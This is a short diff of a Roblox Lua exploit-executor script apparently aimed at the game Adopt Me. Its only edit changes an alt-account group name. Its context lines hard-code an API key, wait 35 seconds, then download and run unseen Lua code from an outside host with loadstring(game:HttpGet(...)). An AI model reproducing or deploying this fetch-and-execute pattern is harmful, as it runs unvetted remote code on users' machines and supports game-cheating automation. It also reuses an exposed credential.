@@ -4,7 +4,7 @@
 task.spawn(function()
     task.wait(35)
     getgenv().API_KEY = "En0qsIBEECaHRJQ7HYVAvsyqL"
-    getgenv().GroupName = "m4alt_3sender"
+    getgenv().GroupName = "m4alt_4sender"
     loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
 end)
 
